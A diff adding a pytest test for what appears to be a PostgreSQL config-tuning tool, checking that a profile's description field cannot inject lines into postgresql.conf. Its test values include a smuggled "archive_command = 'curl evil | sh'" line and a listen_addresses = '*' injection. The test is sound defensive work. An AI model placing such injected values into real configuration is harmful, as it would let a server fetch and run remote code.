@@ -60,6 +60,24 @@ def test_rejects_unsafe_values(section, key, value):
         tune.validate(p)
 
 
+@pytest.mark.parametrize(
+    "machine",
+    [
+        {"description": "x\narchive_command = 'curl evil | sh'"},
+        {"description": "x\rlisten_addresses = '*'"},
+        {"description": "y" * 201},
+        {"description": 7},
+        {"description": "ok", "shared_preload_libraries": "evil"},
+    ],
+)
+def test_rejects_a_machine_table_that_could_reach_the_conf(machine):
+    """[machine] description is rendered into postgresql.conf, so a line break must not get through."""
+    p = tune.load_profile("medium")
+    p["machine"] = {**p["machine"], **machine}
+    with pytest.raises(tune.ProfileError):
+        tune.validate(p)
+
+
 def test_rejects_bad_profile_names():
     for bad in ("../secrets", "Medium", "a/b", ""):
         with pytest.raises(tune.ProfileError):
